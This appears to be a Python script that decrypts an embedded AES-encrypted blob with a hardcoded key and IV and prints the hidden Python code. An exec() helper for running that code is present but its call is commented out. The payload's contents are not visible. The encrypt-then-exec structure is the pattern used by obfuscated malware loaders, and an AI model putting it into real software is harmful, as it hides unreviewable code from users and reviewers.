
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding

def decrypt_script(encrypted_data, iv, key):
    # Create AES cipher with CBC mode
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    # Decrypt the data
    decrypted_padded_data = decryptor.update(encrypted_data) + decryptor.finalize()

    # Remove padding
    unpadder = padding.PKCS7(128).unpadder()
    decrypted_data = unpadder.update(decrypted_padded_data) + unpadder.finalize()

    # Return decrypted Python code
    return decrypted_data.decode('utf-8')

def execute_decrypted_script(decrypted_code):
    # Dynamically execute the decrypted Python code
    exec(decrypted_code)

# Example: Replace this with your actual encryption key (must be the same as used for encryption)
key = b's\x02\xe0\x99g\xe3{\xab2\x8d\xd5w\xb4\x03\xfe\xf3\xabX\xf8\xa4\xaa\x13\t\xbdF\x8aP\x9d\xd2\xe7\x13`'

# Embedded encrypted data and IV
iv = b'\n\xd2a+Y\x9e\xe1Q\xe8\xce\xd4\xf3\x97+\xd0v'  # 16 bytes IV (Initialization Vector)
encrypted_data = b'\xc9\xd4\x0e:\x93X/\xb7\x82\x17g\xb3\r\xa0\x97\xd3/\x10\xbe\x15~\x1d\xc5\x0fF\x1b\x98$\xb5\x8c 7\xfe\xc6\x1a\xf9\xf2\xe9\xc9Gx\xdeT3|G\x15\x06(\x87\xbb\xe5\x9c{{\xd9\x81\xb5\xff\x9f\xbe\xe27\x98Hb\xc5z\xf6F\x0c\xec3<\x1b\x0b\x11\xf5\x1a\\+\xc5h:\n4\x9b\t\x94"\tA\x80!i\xd3\xff_P\x06\xfb\x7f\x81\xf9e_\xab\x0f\r0>\xc0\xb3\xd3\xf5BS8\r\xa8\x85\xef\xa3\x1d\xd2\xd9\xcb(\x9a\xf84\xa4\xad\xfa\x1b\x01\xa7\xe6d\xf7 \xc5\xa3}2\xcc\xe7\xa4\x8f\x02XtU\t\x8b\x10\xbe\xfb\xaaP\xc2\xef\x86\x9f4T\xfb\x1c\x08\xe8\x86\xffBp\x13l\x08D\xca\xecQy\x8a}\x8d\xf1i\xf6\xddN3\x9a\x9fG\x0c]r\xb4*\xbd\xf2\x81\xb8v&\xfb\x08Eq\xba\x97\x1e\'\xbb(\xb74\xe5\xe3<\xa8\xf7\xa7\xd5E\xa9\xb2;\xa3\x1c\xfe\xedK\x01\xf8\xa1f\x98`\x11~\xc2 \x8d 5\xe7\xd1VU^\x9a\xa3\x123\xd6K\xde\xfeY\xa2\x8b\xae\xe5;\xd5\xf1ceS5\xc4\x95\xf0\xd3\xd4\t\x1c\xf8\x86K,\xd3\xf54\x14\'\xd58\x14\xf8|\x10\xa5\x99\xf3\xf1!\x89P\'\x95\x8c\x8e\xfa\xeaI-\x9a\xe5\x14\x99\x1b\xd0\xde\x10\x14\x08\xf7\xda:\x15\x16\xa2\x03\x15\xb0\xd3\x00\x8f\xf0\xfa\xf7Pl\xea\x86\x86\x1d\xa1\x91\x89\x84\xb6\x9fd\xd2\x0b\xd71\xb6\x0c\x9b-\xa3!\xa9\r.\x08c\xba\x0c\xa2\x8e\xc2/\x0c\xaa\xb0R\xb6\x0e\xd8\xb7\x81?\x97*\xd3E3u\x13\x97N\xe4\x81\x96\x12\x94\x1a\x13\x1d@\x1bA\xaa\x9f\x07\x12\x8b\xa2b\xd7\xb6|\x05&\x92\xc8\xfc\xeb\x91\x07_\x9b\x18\xa7&%\x1a\xd3\x16\xc8\xd8=[Q\xb3d\xd1\x9bd\xdbo\x96C\x01\x04\xde\xabr\x9d\xd8\x95\\\xf9>\x171\x0e\xc1nf{\xcc~\xe5\xb4xS\xdds\x92U\xcc\xa8\x86\xe8\xe8i\xbc9<$\n\x9f\xfe\xc6\xb5\xcf\xad\x03\xb8\xf9\xf1\xff>|E\x8c*\x1dK\x04\x9d\xd5\x8a4_\xe3uG\xc8\x82_a\xef\xff\x0e\xd5Rz\x83#z\xbd\n*.\x91\x81\x99d\xd2\xab~\xc1\xd9\xb7\x86\xc1f\x1d\xf4\xfe;B\xfcWBc\xa3\xc1\x9a\xc7\xe8wEOl\xdb\xfc\x1bq\x86\x8av\xb4S\x9aW\xdb\xd9-8`\xdc\x07\x1aY\xf9\xd82\x1f\x89-\x86\x9d\x99\xdbc\xceI|\x8b\xf5c\x88(;\x98\xa2\x07E\xc9C\xe3\x88\x9c4\xdaWV>i\xb240\xd2\xe9\xb3\xfe\xf8\x87\x95\xc5b\xda\x1f\xc0\xd3\xfd\xd9\xfe9MA1\xc7\xd1\xb4\xbc\x02Wr\xe5Lq\x8be\x7f4(\x0f\x15\xef\x1f5\x00\x1b\xf3\xa2G\xa9(*W\x17\xf2-zQU\x8bm\xf5\xec\x04\x87}-\xb8\xe1n\xc0$=\xfa\xd7\x1e\x16)m\xba\xf2\x10\xfe*\xb3\xa6\x17\xe0\x1ah\xcbtC\xbb\x05T\xc8v\xf1\x1f\x8b\x98P\r\xa1\x11=\xc2uk\xd7\xf0\x8a\xf6\xefvn\xbf\xe4\x87jzbMv\xb1\x84\x03\xd1\xda\xb4\xb0\xd5G\x14\xfbRY\x03\xa0\xa6\xbc\xb9%7q\xc9\x1a\xac\x8dv\xab4jd\x1a\x9e_`2\xa7h\xd5M\x89%\x7f\x00\xc0\x98\xe4\xc8\xc7^\xea\xca\x07\x9c@\xaf\x85\x07\xbc\xed}o\xa2\x01\xd1V\x9f\xf9\x80``\xb8/\xa0T\x00\xb6\xe3+a\xe0\x0c\xa1\x15\x9c\x90|nO\xe2i^\xfc\x84"\xe6w\x87\xbb\x86\x05\xf0\xbf<\xce\xa2\xec3\xa8O\xab\xc3\x14\xbb\xda\x88\x84\xf68!\xb7\xe0O\x03(K\xbf\xb4\xe3\xde\xf2 \x9d\x9b\x92\xf8M\xe0\xf4\xd3\x97\x9f[b\xbd\x1f\xfa9\xf2\xc1\xcf\xfeN@\x97\xb8-\xbe\x1d\x9b\x0e3\xd6\xca\x9f\x19\xd5 \x149\x93,\xd6\xeb\xe3\x9c@\x12\xc0\xa9x\xfak?SD\x0e\tV\x99+\x16h\xa2W3\x00\xe8\x8e\xd9\xce\xd1\xad4\x8b\x83%\xe6/\x18Z\xb9\x08\x97}0%>\n\x88\xbb\xbbx\x95Rj\xdd\x86ZP\x85\xfd\x83\xbc\xf8\xb5\xf9\xbc*\xfe(\x80\x91\xb8\xed\x9c\xb9]\xc2;M\xef\x94\x97/\xe3\xfa\xdd\x9b\x02rb\xb5)3\xd5\xbbR\xc9\x06\x91m\xf4\xb4\xb2!\x14\x06\x8f%\x0ffE\xb5\x93\x95+r\xef\xc7\x00 \x9d\xba\x96\xb1Di\x1d\x96\x83]\x03\x16\xedU\xa1\x92\x89\x8a\x85\x03\xbf I\xfa\xff\x8d[\xab=G[\xf2\x1cB\xca\x08\xd9\x02c\xe8\r\xcb\xd0{\x97\xa8\xe0\xbf5\xb3 {XZ\xfc\xcbI\xe415\x17\xef\xfa\xc6?\xc8q&\x98i\xf5f\x08R\x7fU02\xeb\xaf\xfd\xf3'  # This is the encrypted code

# Decrypt and execute the code
decrypted_code = decrypt_script(encrypted_data, iv, key)
print(decrypted_code)
# execute_decrypted_script(decrypted_code)
